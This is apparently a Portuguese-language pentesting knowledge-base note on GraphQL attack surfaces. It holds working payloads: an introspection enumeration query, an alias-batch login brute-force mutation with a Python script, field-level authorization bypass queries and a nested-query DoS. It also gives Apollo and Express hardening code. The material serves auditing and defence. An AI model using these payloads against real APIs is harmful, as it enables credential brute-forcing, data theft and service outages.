# GraphQL — Superfície de Ataque

**Tags:** #alto #graphql #api #introspection #batch #dos
**OWASP:** API8:2023 — Security Misconfiguration (APIs)
**CVSS Base:** 7.5 (Alto — exfiltração + brute force)

---

## 📖 O que é

GraphQL expõe uma API query-by-design que viola o modelo REST de endpoints fixos. A superfície de ataque é radicalmente diferente e requer técnicas específicas de auditoria.

---

## 🔍 `grep_search` Táticas

```
graphql
typeDefs
resolvers
@deprecated
Query {
Mutation {
Subscription {
introspection: false
NoIntrospection
depthLimit
queryComplexity
```

---

## 💣 Ataques por Categoria

### 1. Introspection em Produção

**Como funciona:** com introspection habilitado, o atacante obtém o schema completo — todos os tipos, campos, mutations e métodos, incluindo aqueles não acessíveis pela UI.

```graphql
# Query de enumeração completa do schema
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
          kind
        }
      }
    }
  }
}
```

**Detecção estática:** buscar `introspection: false` ou desabilidação explícita no middleware. **Ausência** = introspection habilitado.

```javascript
// ❌ VULNERÁVEL — introspection habilitado por padrão
const server = new ApolloServer({ typeDefs, resolvers });

// ✅ CORRETO — desabilitar em produção
const server = new ApolloServer({
  typeDefs,
  resolvers,
  introspection: process.env.NODE_ENV !== 'production'
});
```

---

### 2. Batch Query / Alias Attack (Brute Force sem Rate Limit)

**Como funciona:** GraphQL permite múltiplas queries em uma única requisição via aliases. Um atacante pode enviar 1000 tentativas de login em um POST só, contornando rate limiting baseado em contagem de requisições.

```graphql
# Uma única requisição HTTP → 1000 tentativas de senha
mutation {
  a1: login(email: "admin@site.com", password: "password1") { token }
  a2: login(email: "admin@site.com", password: "password2") { token }
  a3: login(email: "admin@site.com", password: "password3") { token }
  # ... até a1000
}
```

```python
# .tmp/graphql_batch_bruteforce.py
import requests

TARGET = "http://target.com/graphql"
EMAIL = "admin@site.com"
PASSWORDS = ["password", "123456", "admin", "admin123", "letmein"]

# Construir batch query
aliases = "\n".join([
    f'a{i}: login(email: "{EMAIL}", password: "{pwd}") {{ token userId }}'
    for i, pwd in enumerate(PASSWORDS)
])

query = f"mutation {{\n{aliases}\n}}"

r = requests.post(TARGET, json={"query": query}, timeout=15)
data = r.json()

for key, value in data.get('data', {}).items():
    if value and value.get('token'):
        print(f"[MATCH] {key}: token={value['token']}")
```

---

### 3. Field-Level Authorization Bypass

**Como funciona:** a autorização é feita apenas no resolver raiz, mas campos individuais não verificam permissão.

```graphql
# Acesso ao campo secreto sem permissão
{
  user(id: 1) {
    id
    email
    secretApiKey    ← campo "oculto" na UI, mas disponível no schema
    internalNotes   ← dados de admin
    creditCard      ← dados PCI
  }
}
```

**Detectar via introspection:** buscar campos `@deprecated`, campos que contêm `secret`, `key`, `internal`, `admin`, `private`.

---

### 4. Nested Query DoS (Query Depth / Complexity)

**Como funciona:** queries circularmente aninhadas sem limite de profundidade derrubam o servidor.

```graphql
# Sem limites de profundidade → DoS
{
  users {
    friends {
      users {
        friends {
          users {
            friends {
              # ... infinito
            }
          }
        }
      }
    }
  }
}
```

**Detecção:** verificar se há middlewares de `depthLimit` ou `queryComplexity`.

```javascript
// ✅ CORRETO — limitar profundidade
const { createComplexityLimitRule } = require('graphql-validation-complexity');

const server = new ApolloServer({
  typeDefs,
  resolvers,
  validationRules: [
    depthLimit(7),                     // máximo 7 níveis
    createComplexityLimitRule(1000),   // score de complexidade máximo
  ]
});
```

---

### 5. Mutations Perigosas via Introspection

```graphql
# Após descobrir mutations via introspection:
{
  __schema {
    mutationType {
      fields {
        name
        args { name type { name } }
      }
    }
  }
}

# Resultado revela mutations como:
# deleteUser(id: ID!)
# grantAdminRole(userId: ID!)
# resetAllPasswords
# ← mutations administrativas não disponíveis na UI mas no schema
```

---

## 🛡️ Hardening de GraphQL

```javascript
// ✅ Configuração segura — GraphQL + Express
const { graphqlHTTP } = require('express-graphql');
const depthLimit = require('graphql-depth-limit');
const { createComplexityLimitRule } = require('graphql-validation-complexity');
const { NoIntrospection } = require('graphql');

app.use('/graphql', graphqlHTTP({
  schema,
  rootValue: resolvers,
  graphiql: process.env.NODE_ENV !== 'production',
  validationRules: [
    // Em produção, desabilitar introspection
    ...(process.env.NODE_ENV === 'production' ? [NoIntrospection] : []),
    depthLimit(7),
    createComplexityLimitRule(1000),
  ]
}));
```

```javascript
// ✅ Field-level authorization via graphql-shield
const { shield, rule } = require('graphql-shield');

const isAdmin = rule()(async (parent, args, ctx) => {
  return ctx.user && ctx.user.role === 'admin';
});

const permissions = shield({
  User: {
    secretApiKey: isAdmin,    // somente admins acessam este campo
    internalNotes: isAdmin,
  }
});
```

---

## 🔗 Chain Exploits

```
Introspection → Mapear mutations ocultas → Executar ação privilegiada
Batch Attack + login mutation → Brute force de admin sem rate limit
Field bypass + PII fields → Dump de dados sensíveis de todos os usuários
Nested query DoS → Derrubar servidor com uma única requisição
SSRF via GraphQL URL field → Pivô para rede interna
```

---

## 📌 Referências
- [[NoSQL Injection]]
- [[IDOR & BOLA — Broken Object Level Authorization]]
- [HackTricks — GraphQL](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql)
- [InQL Scanner](https://github.com/doyensec/inql)
